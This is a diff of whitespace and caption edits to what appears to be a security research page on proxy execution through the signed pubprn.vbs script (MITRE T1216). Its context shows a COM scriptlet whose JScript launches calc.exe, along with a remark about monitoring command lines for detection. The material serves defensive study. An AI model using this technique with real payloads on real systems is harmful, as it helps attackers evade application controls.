@@ -20,12 +20,12 @@ Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml tha
     progid="Bandit"
     version="1.00"
     classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"   
-	>
+    >
 </registration>
 
 <script language="JScript">
 <![CDATA[
-		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
+        var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
 ]]>
 </script>
 
@@ -53,5 +53,5 @@ Monitoring commandlines can be useful in detecting the script being abused:
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1216" %}
+{% embed url="https://attack.mitre.org/wiki/Technique/T1216" caption="" %}
 
